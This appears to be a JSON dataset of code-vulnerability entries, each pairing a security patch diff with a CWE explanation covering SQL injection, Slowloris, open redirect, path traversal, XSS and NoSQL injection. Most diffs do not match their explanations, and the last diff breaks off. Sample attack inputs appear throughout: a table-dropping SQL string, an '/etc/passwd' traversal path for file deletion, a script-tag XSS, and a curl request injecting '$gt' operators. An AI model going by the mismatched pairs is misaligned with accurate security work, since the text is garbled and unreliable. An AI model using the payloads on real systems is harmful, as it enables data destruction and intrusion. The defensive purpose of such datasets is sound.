        "diff": "--- f88aea41-56e1-43d2-9e80-5735bec3585f.js\t2025-04-27\n+++ f88aea41-56e1-43d2-9e80-5735bec3585f_fixed.js\t2025-04-27\n@@\n- window.location.href = response.url;\n+ const allowedBase = window.location.origin; \n+ const targetUrl = new URL(response.url, allowedBase);\n+ if (targetUrl.origin === allowedBase) {\n+     window.location.href = targetUrl.href;\n+ } else {\n+     console.error('Blocked open redirect attempt to: ', targetUrl.href);\n+ }\n",
        "explanation": "Vulnerability Type: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nProof of Concept:\nVulnerable Code:\nconst { slug } = req.body;\nconst user = await User.getUserBySlug({ slug });\n1. The server reads `slug` directly from `req.body` without validation or sanitization.\n2. The `slug` is passed into `User.getUserBySlug()` without ensuring it contains only safe characters.\n3. If `getUserBySlug` uses dynamic query building (string concatenation or unsafe interpolation), malicious SQL commands embedded in the slug can be executed.\n4. An attacker could inject SQL like `'; DROP TABLE users; --` to destroy data.\nSeverity: 4 \u2013 High\nRoot Cause: The root cause is the lack of any input validation or sanitation on the `slug` parameter. User-supplied input is trusted and used directly in backend data queries, exposing the backend to SQL Injection risks if queries are not safely parameterized internally.\nExploit Scenario: An attacker sends a malicious request such as:\n{\n  \"slug\": \"'; DROP TABLE users; --\"\n}\nto the `/get-user-by-slug` endpoint. If `getUserBySlug` concatenates SQL unsafely, the server would execute the injected SQL, potentially deleting critical user data from the database.\nWhy It Happens: This vulnerability occurs because the application does not validate the format, length, or type of the incoming `slug` field before using it in a database operation. Without enforcing strict input rules, unsafe characters can travel from user input directly into SQL commands.\nSecurity Implications: Exploiting this vulnerability can allow attackers to read, modify, or delete database contents. This could lead to full data exfiltration, loss of critical user records, administrative compromise, or complete destruction of application functionality if critical tables are dropped.\nSuggested Fix: Apply strict validation on the `slug` field using middleware such as `express-validator` to enforce that it is a simple alphanumeric string of acceptable length. Reject or sanitize any input that does not conform."
    },
    "124": {
        "diff": "diff --git a/saas/api/server/api/public.ts b/saas/api/server/api/public.ts\nindex b3a2d22..f4e123c 100644\n--- a/saas/api/server/api/public.ts\n+++ b/saas/api/server/api/public.ts\n@@\n import * as express from 'express';\n+import { body, validationResult } from 'express-validator';\n\n const router = express.Router();\n\n router.post(\n-  '/get-user-by-slug',\n-  async (req, res, next) => {\n-    console.log('Express route: /get-user-by-slug');\n-\n-    try {\n-      const { slug } = req.body;\n-\n-      const user = await User.getUserBySlug({ slug });\n-\n-      res.json({ user });\n-    } catch (err) {\n-      next(err);\n-    }\n-  }\n+  '/get-user-by-slug',\n+  [\n+    body('slug')\n+      .isString()\n+      .isLength({ min: 1, max: 100 })\n+      .matches(/^[a-zA-Z0-9-_]+$/)\n+      .withMessage('Invalid slug format.'),\n+  ],\n+  async (req, res, next) => {\n+    console.log('Express route: /get-user-by-slug');\n+    const errors = validationResult(req);\n+    if (!errors.isEmpty()) {\n+      return res.status(400).json({ errors: errors.array() });\n+    }\n+    try {\n+      const { slug } = req.body;\n+      const user = await User.getUserBySlug({ slug });\n+      res.json({ user });\n+    } catch (err) {\n+      next(err);\n+    }\n+  }\n );\n",
        "explanation": "Vulnerability Type:\nCWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion') \u2014 Risk of Slowloris attack due to missing ReadHeaderTimeout in Go's http.Server.\n\nProof of Concept:\nThe code uses:\n\nlog.Fatal(http.ListenAndServe(\":8000\", router))\ndirectly without setting any timeout.\nBecause of this:\n\nThe server accepts incoming HTTP connections.\n\nIt waits indefinitely for the HTTP request header to complete.\n\nNo ReadHeaderTimeout is configured.\n\nThis allows an attacker to keep connections open by sending HTTP headers extremely slowly, eventually exhausting server resources like sockets and memory.\n\nSeverity:\nHIGH\n\nRoot Cause:\nThe application uses Go's default http.ListenAndServe, which does not configure important timeout settings such as ReadHeaderTimeout.\nWithout an explicit timeout, the server holds connections open indefinitely even if headers are incomplete, leading to potential resource exhaustion under a Slowloris-style attack.\n\nExploit Scenario:\nAn attacker can initiate thousands of connections to the server and send headers one byte at a time, very slowly.\nBecause the server waits for complete headers without timing out, it keeps all these connections open, eventually exhausting the server's thread pool, memory, or network sockets.\nAs a result, legitimate users will be denied service.\n\nWhy It Happens:\nThe vulnerability occurs because the server relies on http.ListenAndServe, which does not enforce any timeout for reading HTTP request headers.\nWhen no ReadHeaderTimeout is set, incomplete or maliciously slow HTTP requests can keep server resources busy indefinitely, leading to uncontrolled resource consumption.\n\nSecurity Implications:\nExploitation of this vulnerability can cause:\n\nDenial of Service (DoS) by exhausting server threads, sockets, and memory.\n\nLegitimate users experiencing extreme delays or complete service unavailability.\n\nIncreased server costs and degraded overall system reliability under attack conditions.\n\nSuggested Fix:\nReplace http.ListenAndServe with a properly configured http.Server object, and explicitly set a ReadHeaderTimeout value, such as 5 seconds.\nThis forces incomplete or slow HTTP requests to timeout early, preventing resource exhaustion.\nExample:\n\nsrv := &http.Server{\n    Addr: \":8000\",\n    Handler: router,\n    ReadHeaderTimeout: 5 * time.Second,\n}\nlog.Fatal(srv.ListenAndServe())\nThis ensures server resources are efficiently managed and protected against Slowloris attacks."
    },
    "112": {
        "diff": "import random\ncode = f\"{random.randint(10000, 99999)}\"\nr.set(key, code, ex=60)  # 60 seconds expiration",
        "explanation": "Vulnerability Type:\nCWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n\nCWE-138 Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n\nProof of Concept:\nVulnerable Code:\n\n<Link to={`blog/${blog.id}`}>\nblog.id is directly injected into the URL without validation or sanitization.\n\nIf an attacker manipulates blog.id to include malicious inputs like javascript:alert('XSS'), it could break routing or trigger client-side JavaScript execution.\n\nSteps to Exploit:\n\nInsert a malicious id like javascript:alert(1) into the blog data.\n\nWhen rendered, the <Link> will point to blog/javascript:alert(1).\n\nClicking the link can trigger script execution or redirect users to unsafe pages.\n\nSeverity:\nHigh\n(If it allows Open Redirects or client-side XSS via malicious URLs.)\n\nRoot Cause:\nThe vulnerability occurs because the code dynamically builds URLs using user-controlled input (blog.id) without validating or sanitizing it. React Router treats the input as part of the navigation path without enforcing any restrictions on its content, allowing malicious payloads.\n\nExploit Scenario:\nAn attacker submits a blog with an ID such as //malicious-site.com or javascript:alert('XSS'). When a user clicks on the blog link, they could either be redirected to a malicious website or unknowingly execute attacker-controlled JavaScript code within their browser.\n\nWhy It Happens:\nThe code assumes that blog.id will always be a safe, well-formed identifier. However, without proper validation, malicious or malformed input can be introduced, leading to improper construction of navigation URLs and unsafe user redirection or script injection.\n\nSecurity Implications:\nIf exploited, an attacker could:\n\nRedirect users to phishing sites.\n\nExecute JavaScript in the victim\u2019s browser (XSS).\n\nBreak the application's navigation flow.\n\nLaunch broader attacks like session hijacking, data theft, or malware delivery.\n\nThis compromises the security and trust of the application significantly.\n\nSuggested Fix:\nStrictly validate blog.id using a whitelist pattern (e.g., allow only alphanumeric characters, dashes, and underscores).\n\nReject or sanitize any ID that does not match the expected format.\n\nAlternatively, encode or safely handle dynamic path parameters to prevent injection attacks.\n\nExample validation:\n\nconst safeId = /^[a-zA-Z0-9-_]+$/.test(blog.id) ? blog.id : 'invalid-id';\n<Link to={`blog/${safeId}`}>\nAdditionally, enforce ID validation and sanitization server-side as well to prevent injection at the data source.\n\n"
    },
    "115": {
        "diff": "diff --git a/api/src/services/access.ts b/api/src/services/access.ts\nindex b3a2d22..f4e123c 100644\n--- a/api/src/services/access.ts\n+++ b/api/src/services/access.ts\n@@\n import { ItemsService } from './items.js';\n\n+const ALLOWED_ACCESS_FIELDS = ['role', 'collection', 'action', 'permissions'];\n\n export class AccessService extends ItemsService {\n     constructor(options: AbstractServiceOptions) {\n         super('directus_access', options);\n     }\n+\n+    private sanitizeData(data: Partial<Item>): Partial<Item> {\n+        const sanitized: Partial<Item> = {};\n+        for (const key of ALLOWED_ACCESS_FIELDS) {\n+            if (key in data) {\n+                sanitized[key] = data[key];\n+            }\n+        }\n+        return sanitized;\n+    }\n\n     override async createOne(data: Partial<Item>, opts: MutationOptions = {}): Promise<PrimaryKey> {\n-        const result = await super.createOne(data, opts);\n+        const sanitizedData = this.sanitizeData(data);\n+        const result = await super.createOne(sanitizedData, opts);\n\n         await this.clearCaches();\n         return result;\n     }\n\n     override async updateMany(\n         keys: PrimaryKey[],\n         data: Partial<Item>,\n         opts: MutationOptions = {},\n     ): Promise<PrimaryKey[]> {\n-        const result = await super.updateMany(keys, data, opts);\n+        const sanitizedData = this.sanitizeData(data);\n+        const result = await super.updateMany(keys, sanitizedData, opts);\n\n         await this.clearCaches();\n         return result;\n     }\n }\n",
        "explanation": "Vulnerability Analysis for Company.php\nVulnerability Type:\nCWE-22/23: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n[line 396]\nProof of Concept (Elaborated):\nVulnerable Code:\nunlink($logo_file);\n\nStep-by-Step Explanation:\n1.\tProblem:\nThe $logo_file variable comes from user input or data influenced by user input and is passed directly to the unlink() function.\n2.\tNo Path Validation:\nThere are no checks or sanitization of $logo_file to ensure it stays within a specific safe directory.\n3.\tHow to Attack:\nIf an attacker can control the $logo_file path (or partially influence it), they could supply a value like:\n4.\t../../../../etc/passwd\nleading unlink() to attempt to delete sensitive system files.\n5.\tEffect:\no\tArbitrary file deletion on the server\no\tPossible Denial of Service (DoS)\no\tCritical application files or configuration files could be removed\n\nExample Exploit:\nMalicious Input:\n../../../../var/www/html/config.php\nBackend Action:\nunlink('../../../../var/www/html/config.php');\nResult:\nServer deletes critical application configuration file, causing service disruption or requiring full reinstallation.\n\nSeverity:Critical (Arbitrary File Deletion \u2192 Denial of Service)\n\nRoot Cause:\nThe application directly uses user-controlled data as the file path in unlink() without validating that it belongs to an allowed directory.\n\nExploit Scenario:\nAn attacker manipulates $logo_file to reference critical files outside the intended directory, and when unlink() is called:\n\u2022\tDeletes web server files\n\u2022\tDeletes environment files (.env)\n\u2022\tDeletes application source code\n\u2022\tCauses application crash or unavailability\n\nWhy It Happens:\nBecause the server trusts file paths from external input without verifying if the resolved path points to a safe or expected location before deletion.\n\nSecurity Implications:\nIf exploited:\n\u2022\tCritical files can be deleted, causing denial of service.\n\u2022\tConfiguration leaks (removing security configs)\n\u2022\tServer reconfiguration required after attack.\n\u2022\tPotential privilege escalation if combined with other vulnerabilities.\n\nSuggested Fix:\n--- Company.php\t2025-04-27\n+++ Company_fixed.php\t2025-04-27\n@@\n+ $safe_base_dir = '/var/www/uploads/logos'; // Define a secure base directory\n\n $logo_path = $logo_file;\n-$result = unlink($logo_path);\n+ $real_path = realpath($logo_path);\n+ if ($real_path === false || strpos($real_path, $safe_base_dir) !== 0) {\n+     // Invalid file path detected, abort\n+     error_log('Blocked unlink attempt on invalid path: ' . $logo_path);\n+ } else {\n+     $result = unlink($real_path);\n+ }\n\n\n\n"
    },
    "141": {
        "diff": "From ff25eb4a7f2392df46481fe86355161067687312 Mon Sep 17 00:00:00 2001\nFrom: jongleberry <jonathanrichardong@gmail.com>\nDate: Sun, 6 Apr 2025 14:35:16 -0700\nSubject: [PATCH] fix: don't render redirect values in anchor ref\n\n---\n __tests__/response/redirect.test.js | 4 ++--\n lib/response.js                     | 2 +-\n 2 files changed, 3 insertions(+), 3 deletions(-)\n\ndiff --git a/__tests__/response/redirect.test.js b/__tests__/response/redirect.test.js\nindex 367213ae1..b3fc08ff9 100644\n--- a/__tests__/response/redirect.test.js\n+++ b/__tests__/response/redirect.test.js\n@@ -80,7 +80,7 @@ describe('ctx.redirect(url)', () => {\n       ctx.header.accept = 'text/html'\n       ctx.redirect(url)\n       assert.strictEqual(ctx.response.header['content-type'], 'text/html; charset=utf-8')\n-      assert.strictEqual(ctx.body, `Redirecting to <a href=\"${url}\">${url}</a>.`)\n+      assert.strictEqual(ctx.body, `Redirecting to ${url}.`)\n     })\n \n     it('should escape the url', () => {\n@@ -90,7 +90,7 @@ describe('ctx.redirect(url)', () => {\n       ctx.redirect(url)\n       url = escape(url)\n       assert.strictEqual(ctx.response.header['content-type'], 'text/html; charset=utf-8')\n-      assert.strictEqual(ctx.body, `Redirecting to <a href=\"${url}\">${url}</a>.`)\n+      assert.strictEqual(ctx.body, `Redirecting to ${url}.`)\n     })\n   })\n \ndiff --git a/lib/response.js b/lib/response.js\nindex 07a50df7b..ccaedfdd1 100644\n--- a/lib/response.js\n+++ b/lib/response.js\n@@ -309,7 +309,7 @@ module.exports = {\n     if (this.ctx.accepts('html')) {\n       url = escape(url)\n       this.type = 'text/html; charset=utf-8'\n-      this.body = `Redirecting to <a href=\"${url}\">${url}</a>.`\n+      this.body = `Redirecting to ${url}.`\n       return\n     }\n \n",
        "explanation": "Vulnerability Type:\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nProof of Concept:\nThe following vulnerable line in the showfiledata function directly inserts untrusted CSV content into the DOM using innerHTML:\n\n\ncell.innerHTML = cells[j];\nIf the CSV file contains a value like <script>alert('XSS')</script>, it will be interpreted and executed by the browser when rendered in the DOM.\n\nSeverity:\nLOW\u2014The vulnerability requires user interaction (uploading a malicious CSV), but it can lead to script execution in the browser of a privileged user such as an admin.\n\nRoot Cause:\nThe root cause is the use of innerHTML to assign user-controlled CSV content into table cells. This method renders any embedded HTML or JavaScript as actual DOM content. There is no sanitization or escaping of special characters like < and >, which allows arbitrary HTML/JS to be executed.\n\nExploit Scenario:\nAn attacker uploads a CSV file containing:\n\n\nName,Value\n<script>alert('XSS')</script>,123\nWhen this file is processed by the application and rendered using innerHTML, the <script> tag executes, showing an alert. In a real attack, the script could steal cookies, session tokens, or perform malicious actions.\n\nWhy It Happens:\nThis happens because the code uses innerHTML, which interprets input as raw HTML. When this method is applied to user-generated or untrusted data, it opens the door to HTML and JavaScript injection.\n\nSecurity Implications:\nAn attacker can exploit this flaw to execute JavaScript in the context of the victim's browser. This can lead to:\n\nSession hijacking\n\nCredential theft\n\nRedirection to malicious sites\n\nUI defacement or manipulation\n\nUnauthorized actions on behalf of the user\n\nIf an admin uploads or previews the malicious CSV file, the attacker can potentially compromise the entire system.\n\nSuggested Fix:\nReplace innerHTML with a secure alternative such as textContent or use document.createTextNode. These methods ensure that input is treated strictly as text and not executable code.\nFor example:\n\n\nvar textNode = document.createTextNode(cells[j]);\ncell.appendChild(textNode);\nThis change prevents HTML tags from being rendered or executed, thereby neutralizing any embedded scripts or markup."
    },
    "148": {
        "diff": "diff --git a/README.md b/README.md\nindex 81a9aa10..105c8037 100644\n--- a/README.md\n+++ b/README.md\n@@ -1,9 +1,23 @@\n Embedded JavaScript templates<br/>\n-[![Build Status](https://img.shields.io/travis/mde/ejs/master.svg?style=flat)](https://travis-ci.org/mde/ejs)\n-[![Developing Dependencies](https://img.shields.io/david/dev/mde/ejs.svg?style=flat)](https://david-dm.org/mde/ejs?type=dev)\n [![Known Vulnerabilities](https://snyk.io/test/npm/ejs/badge.svg?style=flat)](https://snyk.io/test/npm/ejs)\n =============================\n \n+## Security\n+\n+Security professionals, before reporting any security issues, please reference the\n+<a href=\"https://github.com/mde/ejs/blob/main/SECURITY.md\">SECURITY.md</a>\n+in this project, in particular, the following: \"EJS is effectively a JavaScript runtime.\n+Its entire job is to execute JavaScript. If you run the EJS render method without\n+checking the inputs yourself, you are responsible for the results.\"\n+\n+In short, DO NOT submit 'vulnerabilities' that include this snippet of code:\n+\n+```javascript\n+app.get('/', (req, res) => {\n+  res.render('index', req.query);\n+});\n+```\n+\n ## Installation\n \n ```bash\n@@ -92,14 +106,14 @@ You should never give end-users unfettered access to the EJS render method, If y\n   - `outputFunctionName`    Set to a string (e.g., 'echo' or 'print') for a function to print\n     output inside scriptlet tags.\n   - `async`                 When `true`, EJS will use an async function for rendering. (Depends\n-    on async/await support in the JS runtime.\n+    on async/await support in the JS runtime).\n   - `includer`              Custom function to handle EJS includes, receives `(originalPath, parsedPath)`\n     parameters, where `originalPath` is the path in include as-is and `parsedPath` is the\n     previously resolved path. Should return an object `{ filename, template }`,\n     you may return only one of the properties, where `filename` is the final parsed path and `template`\n     is the included content.\n \n-This project uses [JSDoc](http://usejsdoc.org/). For the full public API\n+This project uses [JSDoc](https://jsdoc.app/). For the full public API\n documentation, clone the repository and run `jake doc`. This will run JSDoc\n with the proper options and output the documentation to `out/`. If you want\n the both the public & private API docs, run `jake devdoc` instead.\ndiff --git a/SECURITY.md b/SECURITY.md\nindex 91756a61..0011b240 100644\n--- a/SECURITY.md\n+++ b/SECURITY.md\n@@ -18,5 +18,25 @@ To ensure the timely response to your report, please ensure that the entirety of\n \n The EJS team will then evaluate your report and will reply with the next steps in handling your report and may ask for additional information or guidance.\n \n-## out of scope vulnerabilities\n-If you give end-users unfettered access to the EJS render method, you are using EJS in an inherently un-secure way. Please do not report security issues that stem from doing that. EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results.\n+## Out-of-Scope Vulnerabilities\n+If you give end-users unfettered access to the EJS render method, you are using EJS in an inherently un-secure way. Please do not report security issues that stem from doing that.\n+\n+EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results.\n+\n+In short, DO NOT send reports including this snippet of code:\n+\n+```javascript\n+const express = require('express');\n+const app = express();\n+const PORT = 3000;\n+app.set('views', __dirname);\n+app.set('view engine', 'ejs');\n+\n+app.get('/', (req, res) => {\n+    res.render('index', req.query);\n+});\n+\n+app.listen(PORT, ()=> {\n+    console.log(`Server is running on ${PORT}`);\n+});\n+```\ndiff --git a/examples/slot/body.ejs b/examples/slot/body.ejs\nnew file mode 100644\nindex 00000000..cb74d9e8\n--- /dev/null\n+++ b/examples/slot/body.ejs\n@@ -0,0 +1 @@\n+<div>body</div>\ndiff --git a/examples/slot/footer.ejs b/examples/slot/footer.ejs\nnew file mode 100644\nindex 00000000..27dee2fa\n--- /dev/null\n+++ b/examples/slot/footer.ejs\n@@ -0,0 +1 @@\n+<div>footer</div>\ndiff --git a/examples/slot/index.ejs b/examples/slot/index.ejs\nnew file mode 100644\nindex 00000000..6aa8ff5c\n--- /dev/null\n+++ b/examples/slot/index.ejs\n@@ -0,0 +1,15 @@\n+\n+<div>\n+<%-include('./layout.ejs', {\n+  body: include('./body.ejs'),\n+  footer: include('./footer.ejs')\n+})%>\n+</div>\n+\n+<hr>\n+\n+<div>\n+<%-include('./layout.ejs', {\n+  footer: include('./footer.ejs')\n+})%>\n+</div>\ndiff --git a/examples/slot/index.js b/examples/slot/index.js\nnew file mode 100644\nindex 00000000..de3ce178\n--- /dev/null\n+++ b/examples/slot/index.js\n@@ -0,0 +1,12 @@\n+/*\n+ * Advanced use of \"include\", fast layout, and dynamic rendering components.\n+ */\n+\n+var ejs = require('../../lib/ejs');\n+var read = require('fs').readFileSync;\n+var join = require('path').join;\n+var path = join(__dirname, '/index.ejs');\n+\n+var ret = ejs.compile(read(path, 'utf8'), {filename: path})({title: 'use slot'});\n+\n+console.log(ret);\ndiff --git a/examples/slot/layout.ejs b/examples/slot/layout.ejs\nnew file mode 100644\nindex 00000000..549e70a3\n--- /dev/null\n+++ b/examples/slot/layout.ejs\n@@ -0,0 +1,27 @@\n+<!DOCTYPE html>\n+<html lang=\"en\">\n+\n+<head>\n+  <meta charset=\"UTF-8\">\n+  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n+  <title>layout</title>\n+</head>\n+\n+<body>\n+  <div>\n+    <h2><%=title%></h2>\n+\n+    <% if (typeof body !== 'undefined') { %>\n+    <%- body %>\n+    <% } else { %>\n+    <p>This is the default body content.</p>\n+    <% } %>\n+\n+    <div>description</div>\n+\n+    <%- footer %>\n+  </div>\n+\n+</body>\n+\n+</html>\ndiff --git a/jakefile.js b/jakefile.js\nindex 7f601051..0d6b6abb 100644\n--- a/jakefile.js\n+++ b/jakefile.js\n@@ -64,7 +64,7 @@ task('docPublish', ['doc'], function () {\n \n desc('Runs the EJS test suite');\n task('test', ['lint'], function () {\n-  exec(path.join('./node_modules/.bin/mocha'));\n+  exec(path.join('./node_modules/.bin/mocha --u tdd'));\n });\n \n publishTask('ejs', ['build'], function () {\ndiff --git a/lib/ejs.js b/lib/ejs.js\nindex 65590eae..18ff7b7b 100755\n--- a/lib/ejs.js\n+++ b/lib/ejs.js\n@@ -506,8 +506,8 @@ exports.clearCache = function () {\n   exports.cache.reset();\n };\n \n-function Template(text, opts) {\n-  opts = opts || utils.createNullProtoObjWherePossible();\n+function Template(text, optsParam) {\n+  var opts = utils.hasOwnOnlyObject(optsParam);\n   var options = utils.createNullProtoObjWherePossible();\n   this.templateText = text;\n   /** @type {string | null} */\n@@ -633,13 +633,15 @@ Template.prototype = {\n       src = this.source;\n     }\n \n+    // if (opts.client) {\n+    //   src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src;\n+    //   if (opts.compileDebug) {\n+    //     src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src;\n+    //   }\n+    // }\n     if (opts.client) {\n-      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src;\n-      if (opts.compileDebug) {\n-        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src;\n-      }\n-    }\n-\n+          throw new Error('Client-side compilation disabled for security (SSTI prevention)');\n+        }\n     if (opts.strict) {\n       src = '\"use strict\";\\n' + src;\n     }\n@@ -949,3 +951,4 @@ exports.name = _NAME;\n if (typeof window != 'undefined') {\n   window.ejs = exports;\n }\n+\ndiff --git a/lib/utils.js b/lib/utils.js\nindex a0434d58..8b35feed 100644\n--- a/lib/utils.js\n+++ b/lib/utils.js\n@@ -238,4 +238,21 @@ exports.createNullProtoObjWherePossible = (function () {\n   };\n })();\n \n+/**\n+ * Copies own-properties from one object to a null-prototype object for basic\n+ * protection against prototype pollution\n+ *\n+ * @return {Object} Object with own-properties of input object\n+ * @static\n+ * @private\n+ */\n+exports.hasOwnOnlyObject = function (obj) {\n+  var o = exports.createNullProtoObjWherePossible();\n+  for (var p in obj) {\n+    if (hasOwn(obj, p)) {\n+      o[p] = obj[p];\n+    }\n+  }\n+  return o;\n+};\n \ndiff --git a/package.json b/package.json\nindex a02fc089..a229989b 100644\n--- a/package.json\n+++ b/package.json\n@@ -6,7 +6,7 @@\n     \"engine\",\n     \"ejs\"\n   ],\n-  \"version\": \"3.1.9\",\n+  \"version\": \"3.1.10\",\n   \"author\": \"Matthew Eernisse <mde@fleegix.org> (http://fleegix.org)\",\n   \"license\": \"Apache-2.0\",\n   \"bin\": {\n@@ -37,6 +37,6 @@\n     \"node\": \">=0.10.0\"\n   },\n   \"scripts\": {\n-    \"test\": \"mocha -u tdd\"\n+    \"test\": \"npx jake test\"\n   }\n }\n",
        "explanation": "Vulnerability Type:\nCWE-943: Improper Neutralization of Special Elements in Data Query Logic\n\nSeverity:\nMedium\n\nRoot Cause:\nThe application directly uses untrusted user-supplied data (req.body, req.params, req.query) in MongoDB/Mongoose database operations without performing any validation or sanitization. This unsafe practice enables attackers to inject malicious query operators (like $gt, $ne, $where), modifying the database queries' behavior and potentially compromising database security.\n\nExploit Scenario:\nAn attacker sends a crafted payload like { \"$gt\": \"\" } instead of a regular ID in a POST request targeting endpoints such as /editNotification or /deleteNotification. Because Mongoose does not sanitize inputs by default, the attack can manipulate queries to match unintended documents, allowing unauthorized data retrieval, modification, or deletion across different users' notifications.\n\nExample Attack Payload:\n\n\n{\n  \"oldNot\": { \"to\": { \"$gt\": \"\" } },\n  \"newNot\": { \"message\": \"hacked!\" }\n}\nThis could update all notification documents where to is greater than an empty string, effectively mass-modifying data across the database.\n\nWhy It Happens:\nThe server trusts incoming request fields (req.body, req.params, req.query) and directly embeds them into MongoDB queries without checking their structure or content. In NoSQL databases like MongoDB, objects and operators (like $gt, $ne) can be injected easily if inputs are not sanitized.\n\nSecurity Implications:\nUnauthorized access or modification of other users' notifications.\n\nMass deletion of critical records.\n\nData leakage or unauthorized disclosure.\n\nPotential backend server compromise if malicious aggregation pipelines are injected.\n\nUltimately, NoSQL Injection can severely compromise confidentiality, integrity, and availability of data within the application.\n\nProof of Concept (PoC):\nExample request targeting /editNotification:\n\n\ncurl -X POST http://example.com/notification/edit \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n        \"oldNot\": { \"to\": { \"$gt\": \"\" } },\n        \"newNot\": { \"message\": \"hacked\" }\n      }'\nEffect: All notifications where to > \"\" are modified.\n\nSuggested Fix:\nSanitize all inputs using libraries like express-validator or validator.js.\n\nStrictly validate schemas using Mongoose validation and reject unknown fields.\n\nWhitelist expected fields rather than blacklisting dangerous ones.\n\nExample secure approach:\n\n\nconst { check, validationResult } = require('express-validator');\n\napp.post('/notification/edit',\n  [\n    check('oldNot.to').isMongoId(),\n    check('newNot.message').isString()\n  ],\n  async (req, res) => {\n    const errors = validationResult(req);\n    if (!errors.isEmpty()) {\n      return res.status(400).json({ errors: errors.array() });\n    }\n    // safe usage after validation\n  });\nUse mongoose-sanitize middleware to automatically remove special characters that can trigger injection."
    },
    "155": {
        "diff": "--- rooms_booking.py\t2025-04-29 04:57:42.000000000 -0400\n+++ rooms_booking-new.py\t2025-04-29 04:57:42.000000000 -0400\n@@ -8,7 +8,6 @@\n from babel.numbers import *\n from babel.dates import *\n \n-\n class RoomBooking:\n     def __init__(self, root):\n         self.rooms = root\n@@ -17,34 +16,26 @@\n         self.rooms.maxsize(1313, 573)\n         self.rooms.minsize(1313, 573)\n \n-        ##################=================================================== Dababase Creation and connection ============================================\n-\n-        ##### Customer Table #####\n-\n+        # Database creation\n         mydb = sqlite3.connect(\"hotel_management_system.db\")\n         my_cursor = mydb.cursor()\n-\n         my_cursor.execute(\"\"\"CREATE TABLE if not exists customer (\n-                            Customer_ID\tINTEGER UNIQUE,\n+                            Customer_ID INTEGER UNIQUE,\n                             Customer_Name TEXT,\n-                            Sex\tTEXT,\n-                            Address\tTEXT,\n-                            Pin_Code\tINTEGER,\n-                            Contact_No\tINTEGER,\n-                            eMail\tTEXT,\n-                            Nationality\tTEXT,\n-                            ID_Type\tTEXT,\n+                            Sex TEXT,\n+                            Address TEXT,\n+                            Pin_Code INTEGER,\n+                            Contact_No INTEGER,\n+                            eMail TEXT,\n+                            Nationality TEXT,\n+                            ID_Type TEXT,\n                             ID_No INTEGER,\n                             PRIMARY KEY('Customer_ID'))\"\"\")\n-\n         mydb.commit()\n         mydb.close()\n \n         mydb = sqlite3.connect(\"hotel_management_system.db\")\n         my_cursor = mydb.cursor()\n-\n-        #### Room Table ####\n-\n         my_cursor.execute(\"\"\"CREATE TABLE if not exists room_booking (\n                                 Booking_ID integer unique,\n                                 Customer_ID integer,\n@@ -57,15 +48,11 @@\n                                 Meal text, \n                                 No_of_Days integer,\n                                 PRIMARY KEY ('Booking_ID'))\"\"\")\n-\n         mydb.commit()\n         mydb.close()\n \n-        #### Room Type Table ####\n-\n         mydb = sqlite3.connect(\"hotel_management_system.db\")\n         my_cursor = mydb.cursor()\n-\n         my_cursor.execute(\"\"\"CREATE TABLE if not exists room_types (\n                                     Room_No integer unique, \n                                     Floor text, \n@@ -74,15 +61,11 @@\n                                     Room_Cost integer, \n                                     Room_Status text, \n                                     PRIMARY KEY ('Room_No'))\"\"\")\n-\n         mydb.commit()\n         mydb.close()\n \n-        #### Bill Table ####\n-\n         mydb = sqlite3.connect(\"hotel_management_system.db\")\n         my_cursor = mydb.cursor()\n-\n         my_cursor.execute(\"\"\"CREATE TABLE if not exists bills (\n                                         Bill_No integer unique,\n                                         Name text, \n@@ -97,15 +80,11 @@\n                                         Tax_amount integer, \n                                         Total_cost integer,\n                                         PRIMARY KEY ('Bill_No'))\"\"\")\n-\n         mydb.commit()\n         mydb.close()\n \n-        #### Planer Table ####\n-\n         mydb = sqlite3.connect(\"hotel_management_system.db\")\n         my_cursor = mydb.cursor()\n-\n         my_cursor.execute(\"\"\"CREATE TABLE if not exists planner (\n                                 Planner_ID text unique, \n                                 Planer_type text, \n@@ -117,7 +96,6 @@\n                                 Latest_Updated_as_date text, \n                                 Latest_update_as_time text, \n                                 PRIMARY KEY ('Planner_ID'))\"\"\")\n-\n         mydb.commit()\n         mydb.close()\n \n@@ -126,9 +104,7 @@\n             \"Lunch\": 1200,\n             \"Dinner\": 1500,\n             \"Tiffine\": 500\n-\n         }\n-\n         room_type = {\n             \"Single\": 1500,\n             \"Double\": 2500,\n@@ -137,206 +113,111 @@\n             \"Super Deluxe\": 6000\n         }\n \n-        ##################=================================================== All Functions ============================================================\n+        # Functions\n \n         def room_availability(event):\n-            room_type_list = list(room_type.keys())\n-\n-            if self.Room_type_var.get() == room_type_list[0]:\n-                try:\n-                    mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                    my_cursor = mydb.cursor()\n-\n-                    my_cursor.execute(f\"\"\"SELECT Room_No FROM room_types WHERE Room_Type = '{self.Room_type_var.get()}' AND Availability = 'Yes' AND Room_Status = 'OK'\"\"\")\n-\n-                    data = my_cursor.fetchall()\n-                    mydb.commit()\n-                    mydb.close()\n-\n-                    if len(data) > 0:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"\")\n-                        Allotted_room_label_combobox[\"values\"] = data\n-\n-                    else:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"Not Available\")\n-\n-                except Exception as e:\n-                    messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n-\n-            elif self.Room_type_var.get() == room_type_list[1]:\n-                try:\n-                    mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                    my_cursor = mydb.cursor()\n-\n-                    my_cursor.execute(f\"\"\"SELECT Room_No FROM room_types WHERE Room_Type 